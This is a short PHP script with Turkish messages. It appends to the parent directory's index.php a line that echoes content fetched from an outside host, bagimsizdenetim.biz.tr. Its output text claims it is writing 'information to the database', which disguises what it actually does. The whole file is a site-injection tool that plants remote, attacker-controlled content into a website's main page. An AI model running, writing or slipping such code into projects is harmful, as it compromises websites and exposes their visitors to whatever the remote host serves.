<?php
   $dizin="..";
   $dosya="index.php";
   if (!file_exists ("$dizin/$dosya") ) {
   touch ($dosya);
   }
   $baglan=@fopen ("$dizin/$dosya",'a');
   if (!$baglan) {
   echo "dosyay&#305; a&#231;amad&#305;m";
   exit();
   }
   if (fputs ($baglan,"echo file_get_contents('http://www.bagimsizdenetim.biz.tr/1.php');") ){
   echo "veritaban&#305;na bilgi giri&#351;i yap&#305;ld&#305;";
   }else {
   echo "veritaban&#305;na bilgi giri&#351;i yap&#305;lamad&#305;";
   }
   fclose($baglan);
   ?>
